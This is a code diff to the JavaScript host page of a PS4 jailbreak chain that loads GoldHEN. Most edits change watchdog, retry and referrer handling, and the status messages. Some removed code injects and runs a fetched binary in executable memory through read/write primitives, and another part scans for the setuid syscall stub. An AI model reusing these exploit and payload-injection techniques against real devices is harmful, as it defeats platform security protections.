@@ -3,7 +3,7 @@ import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
 import { offsetsFor, PS4 } from "./ps4_offsets.js";
 
-function ensureHostConsole() {
+ function ensureHostConsole() {
   var hide =
     "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;" +
     "overflow:hidden;opacity:0;pointer-events:none;";
@@ -44,8 +44,8 @@ function hostOk() {
 function hostFail() {
   var m = document.getElementById("state");
   if (m) {
-    m.innerHTML = "Failed to Load! Restart Your Console ...";
-    m.style.setProperty("color", "red", "important"); 
+      m.innerHTML = "GoldHEN is Already Loaded Press BACK to EXIT...";
+    m.style.setProperty("color", "yellow", "important"); 
   }
 }
 
@@ -58,21 +58,12 @@ function hostAlready() {
 }
 
 
-function hostRetry() {
-  var m = document.getElementById("state");
-  if (m) {
-    m.innerHTML = "Failed to Load! Reopen the Browser ...";
-	m.style.setProperty("color", "orange", "important"); 
-  }
-}
 
-/* The retry notice. Two things lead here: the chain throws, or it stalls
-   without a word. The watchdog covers the second case. It cannot fire when
-   the whole WebProcess is gone -- then the screen stays as it is -- but in
-   the commoner case, a stuck thread on a live page, the notice appears.
-   Visual notice is suppressed; only #msgs is updated. */
+
 let lastMark = Date.now();
 let retryShown = false;
+
+
 
 function showRetry() {
   if (retryShown) return;
@@ -82,13 +73,29 @@ function showRetry() {
     if (document.body) document.body.className = "fail";
   } catch (e) {}
 }
+
 const WATCHDOG_MS = 45000;
+let terminal = false;
 const watchdog = setInterval(function () {
+  if (terminal) return;
   if (Date.now() - lastMark > WATCHDOG_MS) {
-    try { clearInterval(watchdog); } catch (e) {}
+    endWatchdog();
     showRetry();
   }
 }, 5000);
+
+/* Every outcome is terminal for the watchdog: it only covers a chain that
+   stalls without a word, and once the run has ended -- well or badly -- there
+   is nothing left to stall. Without this the interval kept polling after a
+   SUCCESSFUL run and put "exploit failed" on the television 45 s later, with
+   nothing wrong: on a console the obvious answer to that is to run again,
+   which costs an apm unit out of a supply that lasts one boot. Reported by
+   pengu1nsec. The flag as well as the clear, because a callback can already
+   be queued when the interval goes. */
+function endWatchdog() {
+  terminal = true;
+  try { clearInterval(watchdog); } catch (e) {}
+}
 
 /* The referrer guard. The console's browser restores the page it had open
    last. If that was the armed chain it would run again with nobody in front
@@ -110,7 +117,14 @@ const FROM_LANDING = (function () {
   }
 })();
 
-const SESSION_DONE_KEY = "jb.goldhen_done";
+/* A page the browser restored must do nothing at all. Until this sat here,
+   the refusal came only after the WebKit stage had already run in full --
+   harmless to the kernel, but pointless work on a page nobody asked to run.
+   Send it back to the start page instead; from there the ordinary route
+   takes over, autostart included, and it arms with a proper referrer and a
+   visible countdown. A probe is exempt: it fires nothing and patches
+   nothing. */
+
 const SENT_HOME = (function () {
   const want = params.get("afterglow");
   if (!want || want === "probe" || FROM_LANDING) return false;
@@ -378,34 +392,16 @@ const keepAlive = [];
 let mainMf = null,
   mainOrig = null,
   mainArmed = false;
-let pinRestore = null;
-
-let jbRestoreHook = null;
-let allDone = false,
-  jailbroken = false,
-  kpatched = false,
-  payloadRunning = false;
 
 
 (async function () {
   if (SENT_HOME) return;
-  // 14.00 host defaults: run afterglow with GoldHEN only (original structure kept).
-  if (!params.get("afterglow")) params.set("afterglow", "1");
-  if (!params.get("mode")) params.set("mode", "goldhen");
-  if (!params.get("payload")) params.set("payload", "goldhen.bin");
   let p = null;
 
-  const opened = [];
-  let closeFd = null;
   try {
-    await new Promise(function (r) {
-      setTimeout(r, 100);
-    });
     const { key, off } = offsetsFor(navigator.userAgent);
-    mark("BUILD", "jb=skipjb2 base=ef1670a");
     mark("FW", key || "(not a PS4 UA)");
     if (!off) {
-      /* NONPS4-DEBUG */
       try {
         document.body.classList.add("log");
       } catch (e) {}
@@ -464,7 +460,6 @@ let allDone = false,
         mark("NONPS4-CORE", "error=" + String(e));
       }
 
-      allDone = true;
       return;
     }
     const fwKey = key || "unknown";
@@ -483,6 +478,7 @@ let allDone = false,
         "This build has a kernel stage for firmware " + SUPPORTED.join(", ") +
         " only. Detected " + fwKey + " - nothing was run.",
       );
+      endWatchdog();
       return;
     }
 
@@ -566,18 +562,13 @@ let allDone = false,
         primitiveOk ? "PASS" : "FAIL",
       );
 
-     allDone = true;
       finishUI(primitiveOk);
       return;
     }
 
 
-     const DO_JB = params.get("jb") !== "0";
     const DO_PATCH = params.get("patch") !== "0";
     const DO_PAYLOAD = params.get("payload") !== "0";
-    const SKIPJB = params.get("skipjb") !== "0";
-
-    const KEEP_JB = params.get("keepjb") === "1";
 
     // afterglow brings its own kernel stage, so this run does not need the
     // host's kernel table at all.
@@ -673,56 +664,6 @@ let allDone = false,
       " src=ps4_offsets.js",
     );
 
-
-    const retryArg = parseInt(params.get("retry") || "", 10);
-    const RETRY_MAX = Number.isFinite(retryArg) && retryArg >= 0 ? retryArg : 4;
-    const RETRY_KEY = "jb1352-read-retry";
-    const retryCount = () => {
-      try {
-        const v = parseInt(sessionStorage.getItem(RETRY_KEY) || "0", 10);
-        return Number.isFinite(v) && v > 0 ? v : 0;
-      } catch (e) {
-        return 0;
-      }
-    };
-    const clearRetry = () => {
-      try {
-        sessionStorage.removeItem(RETRY_KEY);
-      } catch (e) {}
-    };
-    const retryBenign = (why) => {
-      const n = retryCount();
-      if (n >= RETRY_MAX) {
-        mark(
-          "AUTO-RELOAD-GIVEUP",
-          "why=" + why + " reloads=" + n + " -- reboot and try again",
-        );
-        return false;
-      }
-      let stored = -1;
-      try {
-        sessionStorage.setItem(RETRY_KEY, String(n + 1));
-        stored = parseInt(sessionStorage.getItem(RETRY_KEY) || "-1", 10);
-      } catch (e) {
-        stored = -1;
-      }
-      if (stored !== n + 1) {
-        mark(
-          "AUTO-RELOAD-NO-STORAGE",
-          "why=" + why + " wrote=" + (n + 1) + " read=" + stored,
-        );
-        return false;
-      }
-      mark("AUTO-RELOAD", "why=" + why + " reload=" + (n + 1) + "/" + RETRY_MAX);
-      setTimeout(() => {
-        try {
-          location.reload();
-        } catch (e) {}
-      }, 400);
-      return true;
-    };
-    if (retryCount() > 0)
-      mark("AUTO-RELOAD-RESUME", "reload=" + retryCount() + "/" + RETRY_MAX);
 
     state("running the primitive...", "warn");
     await new Promise((r) => setTimeout(r, 0));
@@ -1024,100 +965,7 @@ let allDone = false,
       const a = new int64(r.lo, r.hi);
       return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
     }
-   async function relaunchPayload() {
-      let blob = null;
-      try {
-        const r = await fetch(PAYLOAD_FILE);
-        if (r.ok) blob = new Uint8Array(await r.arrayBuffer());
-      } catch (e) {}
-      if (!blob || blob[0] !== 0xe9) {
-        mark("JB-RELAUNCH", "file=" + PAYLOAD_FILE + " blob=unusable");
-        return;
-      }
-      const sz = (blob.length + 0x3fff) & ~0x3fff;
-      const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
-      const entry = new int64(m.lo, m.hi);
-      if (m.i32 === -1 || entry.hi >>> 0 === 0) {
-        mark("JB-RELAUNCH", "mmap failed err=" + errno());
-        return;
-      }
-      for (let o = 0; o < blob.length; o += 8) {
-        let lo = 0,
-          hi = 0;
-        for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
-        for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
-        p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
-      }
-      let bad = -1;
-      for (let o = 0; o < blob.length && bad < 0; o++)
-        if (p.read1(entry.add32(o)) !== blob[o]) bad = o;
-      if (bad >= 0) {
-        mark("JB-RELAUNCH", "copy MISMATCH@0x" + bad.toString(16));
-        return;
-      }
-      const fn = p.read8(webkitBase.add32(off.wk___imp_pthread_create));
-      const expect = libkernelBase.add32(off.k_pthread_create);
-      if (fn.low !== expect.low || fn.hi !== expect.hi) {
-        mark("JB-RELAUNCH", "pthread_create got=" + fn + " want=" + expect);
-        return;
-      }
-      const thr = new ArrayBuffer(8);
-      keepAlive.push(thr);
-      new Uint8Array(thr).fill(0);
-      const rc = callAddr(expect, [bufAddr(thr), 0, entry, 0]).i32;
-      const tdv = new DataView(thr);
-      const handle = new int64(tdv.getUint32(0, true), tdv.getUint32(4, true));
-      payloadRunning = rc === 0 && handle.hi >>> 0 > 0;
-      check(
-        "JB-RELAUNCH",
-        payloadRunning,
-        "file=" +
-          PAYLOAD_FILE +
-          " bytes=" +
-          blob.length +
-          " pthread_create=" +
-          rc +
-          " handle=" +
-          handle,
-      );
-    }
 
-    // Quick already-jailbroken probe (same idea as jb.js). If uid is already 0
-    // we skip the whole afterglow stage and just report "Already Loaded".
-    {
-      const SETUID = 23;
-      if (!stubAddr.has(SETUID)) {
-        for (let o = 0; o < (off.k_scan_stage1 || 0x200000); o += 16) {
-          const v = p.read8(libkernelBase.add32(o));
-          if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
-          if (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 === SETUID) {
-            stubAddr.set(SETUID, libkernelBase.add32(o));
-            break;
-          }
-        }
-      }
-      if (stubAddr.has(SETUID)) {
-        const suRv = sc(SETUID, 0).i32;
-        const uidNow = sc(SYS.getuid).i32;
-        mark("JB-PROBE", "setuid=" + suRv + " uid=" + uidNow);
-        if (suRv === 0 && uidNow === 0) {
-          alreadyLoaded = true;
-          jailbroken = true;
-          payloadRunning = true;
-          allDone = true;
-          mark("JB-ALREADY", "kernel already patched -- afterglow skipped");
-          try { clearInterval(watchdog); } catch (e) {}
-          hostAlready();
-          try {
-            if (mainArmed && mainMf && mainOrig && p) {
-              p.write8(mainMf, mainOrig);
-              mainArmed = false;
-            }
-          } catch (e) {}
-          return;
-        }
-      }
-    }
     if (params.get("afterglow")) {
       /* Arming requires a step from the landing page. A probe
          (afterglow=probe) fires no trigger and patches nothing, so a restored
@@ -1164,7 +1012,7 @@ let allDone = false,
     try { finishUI(false); } catch (e) {}
   } catch (eOuter) {
     try { mark("JB-THREW", (eOuter && eOuter.message) || String(eOuter)); } catch (e) {}
-    try { clearInterval(watchdog); } catch (e) {}
+    endWatchdog();
     // Put it on the television. A failure in the WebKit stage touched
     // NOTHING -- no apm unit spent, no kernel byte written. Reopening the
     // browser is enough; rebooting the console would waste a cycle.
